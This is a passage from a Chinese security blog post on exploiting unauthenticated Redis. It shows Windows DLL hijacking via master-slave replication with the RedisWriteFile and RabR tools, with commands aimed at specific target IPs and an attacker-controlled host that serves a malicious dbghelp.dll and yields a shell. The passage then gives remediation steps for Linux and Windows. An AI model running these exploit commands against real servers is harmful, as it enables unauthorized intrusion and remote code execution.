src=/p/redis-unauthorized-access-exploit/4.png width=1200 height=818 srcset="/p/redis-unauthorized-access-exploit/4_hu_9d937a9209e9777c.png 480w, /p/redis-unauthorized-access-exploit/4_hu_db67b86754b23dda.png 1024w" loading=lazy alt=img class=gallery-image data-flex-grow=146 data-flex-basis=352px></p><p>应用，编译成dll文件即可</p><p><a class=link href=https://github.com/r35tart/RedisWriteFile target=_blank rel=noopener>https://github.com/r35tart/RedisWriteFile</a></p><p><a class=link href=https://github.com/0671/RabR target=_blank rel=noopener>https://github.com/0671/RabR</a></p><p>这两个项目都可以主从复制，去覆盖redis的DLL，达到劫持的效果，在服务器上面运行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 RedisWriteFile.py --rhost 39.99.240.173 --rport <span class=m>6379</span> --lhost 47.109.176.117 --lport <span class=m>16379</span> --rpath <span class=s1>&#39;C:\\Program Files\\Redis\\&#39;</span> --rfile <span class=s1>&#39;dbghelp.dll&#39;</span> --lfile <span class=s1>&#39;dbghelp.dll&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># redis链接执行命令加载DLL</span>
</span></span><span class=line><span class=cl>redis-cli -h 39.99.240.173
</span></span><span class=line><span class=cl>bgsave
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/redis-unauthorized-access-exploit/5.png width=1101 height=689 srcset="/p/redis-unauthorized-access-exploit/5_hu_54c97ae7f84997e6.png 480w, /p/redis-unauthorized-access-exploit/5_hu_3862a16eb1ae2122.png 1024w" loading=lazy alt=img class=gallery-image data-flex-grow=159 data-flex-basis=383px></p><p>或者是用RabR，我感觉这个更方便，可以直接上线</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 redis-attack.py -r 39.99.231.97 -L 47.109.176.117 -wf dbghelp.dll
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>h
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/redis-unauthorized-access-exploit/6.png width=1011 height=510 srcset="/p/redis-unauthorized-access-exploit/6_hu_e3aaaeb372d531b4.png 480w, /p/redis-unauthorized-access-exploit/6_hu_b5f6f74e5f429e94.png 1024w" loading=lazy alt=img class=gallery-image data-flex-grow=198 data-flex-basis=475px></p><p><img src=/p/redis-unauthorized-access-exploit/7.png width=1511 height=744 srcset="/p/redis-unauthorized-access-exploit/7_hu_2f5ba9ab6154d91a.png 480w, /p/redis-unauthorized-access-exploit/7_hu_176198edf75d646d.png 1024w" loading=lazy alt=img class=gallery-image data-flex-grow=203 data-flex-basis=487px></p><p>修复，升级版本，禁用bgsave，以及权限控制</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 升级到最新Windows版Redis</span>
</span></span><span class=line><span class=cl><span class=c1># 或实施以下措施：</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 文件权限控制</span>
</span></span><span class=line><span class=cl>icacls <span class=s2>&#34;C:\Program Files\Redis\*.dll&#34;</span> /deny Everyone:<span class=o>(</span>M<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 禁用BGSAVE命令</span>
</span></span><span class=line><span class=cl>CONFIG SET rename-command BGSAVE <span class=s2>&#34;&#34;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=修复-1>修复</h2><p>既然是未授权那修复必然是以修复未授权为主，设置密码、限制外部访问、禁用危险命令、改为低权限用户执行、使用docker运行redis从而开启了隔离环境对服务器来说</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## 设置强密码</span>
</span></span><span class=line><span class=cl>CONFIG SET requirepass <span class=s2>&#34;?6EFb|J5QZN)G)RX-hQ!&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>bind</span> 127.0.0.1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## 限制外部访问</span>
</span></span><span class=line><span class=cl>sudo iptables -A INPUT -p tcp --dport <span class=m>6379</span> -s 127.0.0.1 -j ACCEPT
</span></span><span class=line><span class=cl>sudo iptables -A INPUT -p tcp --dport <span class=m>6379</span> -j DROP
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## 禁用危险命令</span>
</span></span><span class=line><span class=cl>CONFIG SET rename-command CONFIG disabled_CONFIG
</span></span><span class=line><span class=cl>CONFIG SET rename-command FLUSHALL disabled_FLUSHALL
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 修改配置文件</span>
</span></span><span class=line><span class=cl><span class=c1>## /etc/systemd/system/redis.service</span>
</span></span><span class=line><span class=cl><span class=o>[</span>Service<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=nv>User</span><span class=o>=</span>redis
</span></span><span class=line><span class=cl><span class=nv>Group</span><span class=o>=</span>redis
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## docker运行</span>
</span></span><span class=line><span class=cl>docker run --name redis -d --restart<span class=o>=</span>always -p 127.0.0.1:6379:6379 redis --requirepass <span class=s2>&#34;?6EFb|J5QZN)G)RX-hQ!&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## 重启redis</span>
</span></span><span class=line><span class=cl>sudo systemctl restart redis
</span></span></code></pre></td></tr></table></div></div><p>对于windows的话文件不一样，所以也写一份</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## 设置强密码</span>
</span></span><span class=line><span class=cl>CONFIG SET requirepass <span class=s2>&#34;?6EFb|J5QZN)G)RX-hQ!&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## 限制外部访问</span>
</span></span><span class=line><span class=cl><span class=c1># 在Windows防火墙中创建入站规则</span>
</span></span><span class=line><span class=cl>New-NetFirewallRule -DisplayName <span class=s2>&#34;Allow Redis Local&#34;</span> -Direction Inbound -Protocol TCP -LocalPort <span class=m>6379</span> -Action Allow -RemoteAddress 127.0.0.1
</span></span><span class=line><span class=cl>New-NetFirewallRule -DisplayName <span class=s2>&#34;Block Redis External&#34;</span> -Direction Inbound -Protocol TCP -LocalPort <span class=m>6379</span> -Action Block -RemoteAddress Any
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## 禁用危险命令</span>
</span></span><span class=line><span class=cl>CONFIG SET rename-command CONFIG disabled_CONFIG
</span></span><span class=line><span class=cl>CONFIG SET rename-command FLUSHALL disabled_FLUSHALL
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 修改配置文件</span>
</span></span><span class=line><span class=cl><span class=c1>## redis.windows.conf</span>
</span></span><span class=line><span class=cl>requirepass <span class=s2>&#34;?6EFb|J5QZN)G)RX-hQ!&#34;</span>
</span></span><span class=line><span class=cl>protected-mode yes
</span></span><span class=line><span class=cl><span class=nb>bind</span> 127.0.0.1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## 重启redis</span>
</span></span><span class=line><span class=cl><span class=c1># 使用命令行重新启动Redis服务</span>
</span></span><span class=line><span class=cl>Stop-Service redis
</span></span><span class=line><span class=cl>Start-Service redis
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## 使用Docker运行</span>
</span></span><span class=line><span class=cl>docker run --name redis -d --restart<span class=o>=</span>always -p 127.0.0.1:6379:6379 redis --requirepass <span class=s2>&#34;your_password&#34;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=小结>小结</h2><p>未授权可谓是最好打的洞了，这里仅仅谈及如何利用，漏洞原理的话我看了看，大部分网上都有的，大家去看大佬的文章就好了。</p></section><footer class=article-footer><section class=article-tags><a href=/tags/redis/>Redis</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/internal-network-egress/><div class=article-details><h2 class=article-title>线下出网配置</h2></div></a></article><article><a href=/p/kubernetes-remote-api-unauthorized/><div class=article-details><h2 class=article-title>K8s Remote Api未授权利用</h2></div></a></article><article><a href=/p/kubernetes-getting-started-tutorial/><div class=article-details><h2 class=article-title>Kubernetes基础入门使用</h2></div></a></article><article><a href=/p/docker-compose-no-egress/><div class=article-details><h2 class=article-title>不出网compose编写</h2></div></a></article><article><a href=/p/docker-remote-api-unauthorized-access-exploit/><div class=article-details><h2 class=article-title>Docker Remote Api 未授权利用</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
2024 -
2025 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.31.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>